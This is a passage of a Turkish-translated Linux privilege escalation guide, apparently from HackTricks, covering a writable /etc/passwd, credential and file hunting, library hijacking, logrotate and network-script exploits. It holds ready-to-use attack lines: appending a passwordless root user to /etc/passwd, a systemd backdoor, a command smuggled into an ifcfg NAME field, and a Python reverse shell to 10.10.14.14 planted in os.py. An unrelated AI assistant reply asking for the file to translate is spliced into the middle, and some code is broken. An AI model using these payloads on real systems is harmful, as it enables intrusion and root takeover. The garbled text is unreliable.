grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Yazılabilir /etc/passwd

İlk olarak, aşağıdaki komutlardan biriyle bir password oluşturun.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
I don't have the file content. Please paste the contents of src/linux-hardening/privilege-escalation/README.md that you want translated.

Also confirm how you want the `hacker` user added:
- Should I append a code example to the translated README showing the commands to create the user and set a generated password?
- If yes, do you want me to generate a random password now (specify length/complexity) and include it in the README, or leave a placeholder for you to replace?

Answer these and paste the README content, and I'll return the translated Markdown with the requested user/password snippet.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Örnek: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Artık `su` komutunu `hacker:hacker` ile kullanabilirsiniz.

Alternatif olarak, parola olmadan sahte bir kullanıcı eklemek için aşağıdaki satırları kullanabilirsiniz.\
UYARI: makinenin mevcut güvenliğini zayıflatabilirsiniz.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOT: BSD platformlarında `/etc/passwd` `/etc/pwd.db` ve `/etc/master.passwd`'de bulunur; ayrıca `/etc/shadow` `/etc/spwd.db` olarak yeniden adlandırılmıştır.

Bazı hassas dosyalara **yazıp yazamayacağınızı** kontrol etmelisiniz. Örneğin, herhangi bir **servis yapılandırma dosyasına** yazabiliyor musunuz?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Örneğin, makinede bir **tomcat** sunucusu çalışıyorsa ve **modify the Tomcat service configuration file inside /etc/systemd/,** yapabiliyorsanız, şu satırları değiştirebilirsiniz:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Backdoor'unuz, tomcat bir sonraki başlatıldığında çalıştırılacaktır.

### Klasörleri Kontrol Et

Aşağıdaki klasörler yedekler veya ilginç bilgiler içerebilir: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Muhtemelen sonuncusunu okuyamayacaksınız ama deneyin)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Tuhaf Konum/Owned dosyalar
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Son birkaç dakikada değiştirilen dosyalar
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB dosyaları
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml dosyalar
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Gizli dosyalar
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH İçindeki Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web dosyaları**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Yedekler**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Known files containing passwords

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) kodunu inceleyin, **passwords içerebilecek birkaç olası dosyayı** arar.\
**Bunu yapmak için kullanabileceğiniz başka bir ilginç araç**: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — Windows, Linux & Mac için yerel bilgisayarda depolanan çok sayıda passwords'i almak için kullanılan açık kaynaklı bir uygulamadır.

### Logs

Eğer logs'ları okuyabiliyorsanız, içinde **ilginç/gizli bilgiler** bulabilirsiniz. Log ne kadar garipse, muhtemelen o kadar ilginç olur.\
Ayrıca, bazı "**bad**" yapılandırılmış (backdoored?) **audit logs**, bu gönderide açıklandığı gibi, audit logs içine **passwords kaydetmenize** izin verebilir: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Kayıtları **okumak için grup** [**adm**](interesting-groups-linux-pe/index.html#adm-group) gerçekten çok yardımcı olacaktır.

### Shell dosyaları
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Dosya adında veya içeriğinde "**password**" kelimesi geçen dosyaları kontrol etmelisiniz; ayrıca loglar içinde IP'leri ve e-postaları veya hashes regexps'leri de kontrol edin.\
Bunların hepsini burada nasıl yapacağınızı listelemeyeceğim ama ilgileniyorsanız [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) tarafından yapılan son kontrolleri inceleyebilirsiniz.

## Yazılabilir dosyalar

### Python library hijacking

Eğer bir **python** scriptinin **nereden** çalıştırılacağını biliyorsanız ve o klasöre **yazabiliyorsanız** veya **python kütüphanelerini değiştirebiliyorsanız**, OS kütüphanesini değiştirip ona backdoor ekleyebilirsiniz (eğer python scriptinin çalıştırılacağı yere yazabiliyorsanız, os.py kütüphanesini kopyalayıp yapıştırın).

To **backdoor the library** just add at the end of the os.py library the following line (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate istismarı

`logrotate`'deki bir güvenlik açığı, bir log dosyası veya üst dizinlerinde **yazma izinleri** olan kullanıcıların potansiyel olarak ayrıcalık yükseltmesine izin verebilir. Bunun nedeni, sıklıkla **root** olarak çalışan `logrotate`'in, özellikle _**/etc/bash_completion.d/**_ gibi dizinlerde keyfi dosyaları çalıştıracak şekilde manipüle edilebilmesidir. İzinleri sadece _/var/log_ içinde değil, log rotasyonu uygulanan herhangi bir dizinde de kontrol etmek önemlidir.

> [!TIP]
> Bu güvenlik açığı `logrotate` sürüm `3.18.0` ve daha eski sürümleri etkiler

Güvenlik açığı hakkında daha detaylı bilgi şu sayfada bulunabilir: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Bu güvenlik açığı [**logrotten**](https://github.com/whotwagner/logrotten) ile istismar edilebilir.

Bu güvenlik açığı [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** ile çok benzer olduğundan logları değiştirebildiğinizi gördüğünüzde, bu logları kim yönettiğini kontrol edin ve logları symlink ile değiştirerek ayrıcalıkları yükseltip yükseltemeyeceğinizi kontrol edin.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Güvenlik açığı referansı:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Eğer herhangi bir nedenle bir kullanıcı _/etc/sysconfig/network-scripts_ dizinine bir `ifcf-<whatever>` scriptini **yazabiliyor** veya mevcut bir dosyayı **düzenleyebiliyorsa**, sisteminiz **system is pwned** demektir.

Network scriptleri, örneğin _ifcg-eth0_, ağ bağlantıları için kullanılır. Tamamen .INI dosyalarına benzerler. Ancak, Linux'ta Network Manager (dispatcher.d) tarafından ~sourced~ edilirler.

Benim durumumda, bu network scriptlerindeki `NAME=` özniteliği doğru şekilde işlenmiyor. Eğer isimde **boşluk/blank space** varsa, **sistem boşluktan sonraki kısmı çalıştırmaya çalışıyor**. Bu demektir ki **ilk boşluktan sonra gelen her şey root olarak çalıştırılıyor**.

Örneğin: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Not: Network ile /bin/id arasında boşluk olduğunu unutmayın_)

### **init, init.d, systemd, ve rc.d**

The directory `/etc/init.d` is home to **scripts** for System V init (SysVinit), the **classic Linux service management system**. It includes scripts to `start`, `stop`, `restart`, and sometimes `reload` services. These can be executed directly or through symbolic links found in `/etc/rc?.d/`. An alternative path in Redhat systems is `/etc/rc.d/init.d`.

On the other hand, `/etc/init` is associated with **Upstart**, a newer **service management** introduced by Ubuntu, using configuration files for service management tasks. Despite the transition to Upstart, SysVinit scripts are still utilized alongside Upstart configurations due to a compatibility layer in Upstart.

**systemd** emerges as a modern initialization and service manager, offering advanced features such as on-demand daemon starting, automount management, and system state snapshots. It organizes files into `/usr/lib/systemd/` for distribution packages and `/etc/systemd/system/` for administrator modifications, streamlining the system administration process.

## Diğer Püf Noktaları

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks commonly hook a syscall to expose privileged kernel functionality to a userspace manager. Weak manager authentication (e.g., signature checks based on FD-order or poor password schemes) can enable a local app to impersonate the manager and escalate to root on already-rooted devices. Learn more and exploitation details here:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Daha fazla yardım

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux local privilege escalation vektörlerini aramak için en iyi araç:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Referanslar

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
